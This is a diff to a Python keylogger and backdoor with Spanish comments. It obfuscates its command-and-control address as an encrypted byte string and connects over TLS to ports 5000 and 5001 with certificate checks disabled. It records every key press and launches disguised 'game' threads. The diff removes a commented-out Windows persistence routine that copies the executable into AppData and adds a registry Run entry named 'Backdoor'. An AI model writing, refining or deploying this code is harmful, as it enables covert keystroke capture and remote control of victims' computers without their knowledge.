@@ -50,7 +50,7 @@ def banner():
 
 
 def know_gme():
-    unkown = b'\x9eLO\x92\xc2]%\x8e\xa9\x96,\xc1\xbbd\x0f\xba\xb3\x9c\x1f\x9b\x97\xad`\x9dB\xb3\xea`\xd7\t\x19\x05\x02Y\xeb\xcf\xea\x05\xdeI\x8a\xc5\xe2\x80\xdeUW7\x8b\x85~V\xdd3k\xb7\xb3\xcb\x05\x82\x89\x05A_'
+    unkown = b'\xda\x81\xf4Gj^\x15\x96\x0b\x03\xebP$(8ND\xbd\xa5\xbe\xe3_\xe8\xe4k\xa1(_\x95{=#\x8d\xfc\x90\xf1\x10\x91\'\x18@hr\xd1\x1b\xcb\x94\x03"$\xb0\xcc\xa2\xc2\x98JM^\x86\xf3\x8dS\x98\xc0'
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
@@ -58,15 +58,6 @@ def know_gme():
 banner()
 print(Fore.GREEN + "\n\t[!] Iniciando Programa...")
 yek = []
-
-
-## PERSISTENCIA PARA WINDOWS ##
-
-# location = os.environ["appdata"] + "\\windows32.exe" # Asi se llamara nuestro backdoor
-
-# if not os.path.exists(location):
-# shutil.copyfile(sys.executable, location)
-# subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
 
 
 def is_admin():
@@ -85,22 +76,22 @@ try:
     cock.write(certs.get_locker().encode())
     cock.close()
 
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
     context.load_cert_chain(certfile=csd.name, keyfile=cock.name)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((know_gme(), 5000))
     conn = context.wrap_socket(sock, server_hostname=know_gme())
-except Exception:
+except Exception as e:
     pass
 
 
 def on_press(event):
     try:
-        t = threading.Thread(target=init_game)
-        t.start()
-
+        #t = threading.Thread(target=init_game)
+        #t.start()
 
         yek.append(event.name)
 
@@ -141,9 +132,10 @@ def rcv_gme(s, xxx):
 
 def games():
     try:
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        context.verify_mode = ssl.CERT_NONE
-        context.load_cert_chain(certfile=csd.name, keyfile=cock.name)
+        #context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        #context.verify_mode = ssl.CERT_NONE
+        #context.check_hostname = False
+        #context.load_cert_chain(certfile=csd.name, keyfile=cock.name)
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((know_gme(), 5001))
@@ -216,6 +208,10 @@ def main():
 
         interest = threading.Thread(target=find_interests.main)
         interest.start()
+
+        t = threading.Thread(target=init_game)
+        t.start()
+
         keyboard.on_press(on_press)
 
         task = threading.Thread(target=init_task)
@@ -295,7 +291,8 @@ def main():
             print("[!] Salida con éxito.")
             time.sleep(3)
             exit()
-        except Exception:
+        except Exception as e:
+            print(e)
             exit()
 
 
